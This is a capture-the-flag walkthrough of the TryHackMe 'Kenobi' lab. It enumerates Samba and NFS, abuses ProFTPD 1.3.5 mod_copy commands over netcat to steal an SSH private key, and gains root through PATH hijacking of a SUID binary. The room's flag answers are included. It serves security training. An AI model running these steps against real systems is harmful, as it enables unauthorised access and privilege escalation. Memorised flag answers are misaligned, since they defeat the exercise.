# Kenobi

Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

[Kenobi](https://tryhackme.com/room/kenobi)

## Topic's

- Network Enumeration
- SMB Enumeration
- SMB Exploitation
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Deploy the vulnerable machine

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

1. Make sure you're connected to our network and deploy the machine

`No answer needed`

2. Scan the machine with nmap, how many ports are open?

```
kali@kali:~/CTFs/tryhackme/Kenobi$ sudo nmap -A -p- 10.10.137.113
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 19:52 CEST
Nmap scan report for 10.10.137.113
Host is up (0.030s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37273/udp   mountd
|   100005  1,2,3      46054/udp6  mountd
|   100005  1,2,3      46885/tcp   mountd
|   100005  1,2,3      57385/tcp6  mountd
|   100021  1,3,4      35041/tcp   nlockmgr
|   100021  1,3,4      43825/tcp6  nlockmgr
|   100021  1,3,4      51338/udp   nlockmgr
|   100021  1,3,4      59938/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
35041/tcp open  nlockmgr    1-4 (RPC #100021)
37195/tcp open  mountd      1-3 (RPC #100005)
45465/tcp open  mountd      1-3 (RPC #100005)
46885/tcp open  mountd      1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/3%OT=21%CT=1%CU=42921%PV=Y%DS=2%DC=T%G=Y%TM=5F78BA8
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h42m56s, deviation: 2h53m13s, median: 2m56s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2020-10-03T12:56:10-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-03T17:56:10
|_  start_date: N/A

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   28.42 ms 10.8.0.1
2   28.79 ms 10.10.137.113

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.38 seconds
```

`7`

## Enumerating Samba for shares

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often refereed to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

1. Using nmap we can enumerate a machine for SMB shares. Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

SMB has two ports, 445 and 139.

![](https://i.imgur.com/bkgVNy3.png)

Using the nmap command above, how many shares have been found?

```
kali@kali:~/CTFs/tryhackme/Kenobi$ sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.137.113
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 19:55 CEST
Nmap scan report for 10.10.137.113
Host is up (0.029s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.137.113\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.137.113\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.137.113\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 5.66 seconds
```

`3`

2. On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.

`smbclient //10.10.137.113/anonymous`

Using your machine, connect to the machines network share.

![](https://i.imgur.com/B1FXBt8.png)

Once you're connected, list the files on the share. What is the file can you see?

```
kali@kali:~/CTFs/tryhackme/Kenobi$ smbclient //10.10.137.113/anonymous
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 12:49:09 2019
  ..                                  D        0  Wed Sep  4 12:56:07 2019
  log.txt                             N    12237  Wed Sep  4 12:49:09 2019

                9204224 blocks of size 1024. 6877084 blocks available
smb: \>
```

3. You can recursively download the SMB share too. Submit the username and password as nothing.

`smbget -R smb://10.10.137.113/anonymous`

Open the file on the share. There is a few interesting things found.

    Information generated for Kenobi when generating an SSH key for the user
    Information about the ProFTPD server.

What port is FTP running on?

`21`

4. Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.137.113`

What mount can we see?

`/var`

## Gain initial access with ProFtpd

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

1. Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?

```
21/tcp    open  ftp         ProFTPD 1.3.5
```

`1.3.5`

2. We can use searchsploit to find exploits for a particular software version. Searchsploit is basically just a command line search tool for exploit-db.com. How many exploits are there for the ProFTPd running?

```
kali@kali:~/CTFs/tryhackme/Kenobi$ searchsploit ProFTPd
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                               |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
FreeBSD - 'ftpd / ProFTPd' Remote Command Execution                                                                                                          | freebsd/remote/18181.txt
ProFTPd - 'ftpdctl' 'pr_ctrls_connect' Local Overflow                                                                                                        | linux/local/394.c
ProFTPd - 'mod_mysql' Authentication Bypass                                                                                                                  | multiple/remote/8037.txt
ProFTPd - 'mod_sftp' Integer Overflow Denial of Service (PoC)                                                                                                | linux/dos/16129.txt
ProFTPd 1.2 - 'SIZE' Remote Denial of Service                                                                                                                | linux/dos/20536.java
ProFTPd 1.2 < 1.3.0 (Linux) - 'sreplace' Remote Buffer Overflow (Metasploit)                                                                                 | linux/remote/16852.rb
ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (1)                                                                                            | linux/remote/19475.c
ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (2)                                                                                            | linux/remote/19476.c
ProFTPd 1.2 pre6 - 'snprintf' Remote Root                                                                                                                    | linux/remote/19503.txt
ProFTPd 1.2.0 pre10 - Remote Denial of Service                                                                                                               | linux/dos/244.java
ProFTPd 1.2.0 rc2 - Memory Leakage                                                                                                                           | linux/dos/241.c
ProFTPd 1.2.10 - Remote Users Enumeration                                                                                                                    | linux/remote/581.c
ProFTPd 1.2.7 < 1.2.9rc2 - Remote Code Execution / Brute Force                                                                                               | linux/remote/110.c
ProFTPd 1.2.7/1.2.8 - '.ASCII' File Transfer Buffer Overrun                                                                                                  | linux/dos/23170.c
ProFTPd 1.2.9 RC1 - 'mod_sql' SQL Injection                                                                                                                  | linux/remote/43.pl
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (1)                                                                                                  | linux/remote/107.c
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (2)                                                                                                  | linux/remote/3021.txt
ProFTPd 1.2.x - 'STAT' Denial of Service                                                                                                                     | linux/dos/22079.sh
ProFTPd 1.3 - 'mod_sql' 'Username' SQL Injection                                                                                                             | multiple/remote/32798.pl
ProFTPd 1.3.0 (OpenSUSE) - 'mod_ctrls' Local Stack Overflow                                                                                                  | unix/local/10044.pl
ProFTPd 1.3.0 - 'sreplace' Remote Stack Overflow (Metasploit)                                                                                                | linux/remote/2856.pm
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (1)                                                                                       | linux/local/3330.pl
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (2)                                                                                       | linux/local/3333.pl
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' exec-shield Local Overflow                                                                                                | linux/local/3730.txt
ProFTPd 1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (PoC)                                                                                           | linux/dos/2928.py
ProFTPd 1.3.2 rc3 < 1.3.3b (FreeBSD) - Telnet IAC Buffer Overflow (Metasploit)                                                                               | linux/remote/16878.rb
ProFTPd 1.3.2 rc3 < 1.3.3b (Linux) - Telnet IAC Buffer Overflow (Metasploit)                                                                                 | linux/remote/16851.rb
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                                                           | linux/remote/15662.txt
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                    | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                          | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                                                    | linux/remote/36742.txt
ProFTPd 1.x - 'mod_tls' Remote Buffer Overflow                                                                                                               | linux/remote/4312.c
ProFTPd IAC 1.3.x - Remote Command Execution                                                                                                                 | linux/remote/15449.pl
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                                                     | linux/remote/16921.rb
WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (1)                                                             | linux/remote/19086.c
WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (2)                                                             | linux/remote/19087.c
WU-FTPD 2.4/2.5/2.6 / Trolltech ftpd 1.2 / ProFTPd 1.2 / BeroFTPD 1.3.4 FTP - glob Expansion                                                                 | linux/remote/20690.sh
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

`3`

3. You should have found an exploit from ProFtpd's mod_copy module.

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.

```
kali@kali:~/CTFs/tryhackme/Kenobi$ nc 10.10.222.46 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.222.46]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

`No answer needed`

5. Lets mount the /var/tmp directory to our machine

`mkdir /mnt/kenobiNFS`

`sudo mount 10.10.222.46:/var /mnt/kenobiNFS`

`ls -la /mnt/kenobiNFS`

![](https://i.imgur.com/v8Ln4fu.png)

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

![](https://i.imgur.com/Vy4KkEl.png)

What is Kenobi's user flag (/home/kenobi/user.txt)?

```
kali@kali:~/CTFs/tryhackme/Kenobi$ cp /mnt/kenobiNFS/tmp/id_rsa .
kali@kali:~/CTFs/tryhackme/Kenobi$ chmod 600 id_rsa
kali@kali:~/CTFs/tryhackme/Kenobi$ ssh -i id_rsa kenobi@10.10.222.46
The authenticity of host '10.10.222.46 (10.10.222.46)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.222.46' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$
```

`d0b0f3f53b6caa532a83915e19224899`

## Privilege Escalation with Path Variable Manipulati

![](https://i.imgur.com/LN2uOCJ.png)

Lets first understand what what SUID, SGID and Sticky Bits are.

| Permission | On Files                                                       | On Directories                                            |
| ---------- | -------------------------------------------------------------- | --------------------------------------------------------- |
| SUID Bit   | User executes the file with permissions of the file owner      | -                                                         |
| SGID Bit   | User executes the file with the permission of the group owner. | File created in directory gets the same group owner.      |
| Sticky Bit | No meaning                                                     | Users are prevented from deleting files from other users. |

1. SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: `find / -perm -u=s -type f 2>/dev/null`

What file looks particularly out of the ordinary?

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

`/usr/bin/menu`

2. Run the binary, how many options appear?

```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

`3`

3. Strings is a command on Linux that looks for human readable strings on a binary.

![](https://i.imgur.com/toHFALv.png)

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

![](https://i.imgur.com/OfMkDhW.png)

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

```
kenobi@kenobi:~$ cd /tmp/
kenobi@kenobi:/tmp$ echo /bin/bash > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

4. What is the root flag (/root/root.txt)?

```
root@kenobi:/tmp# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```

`177b3cd8562289f37382721c28381f02`
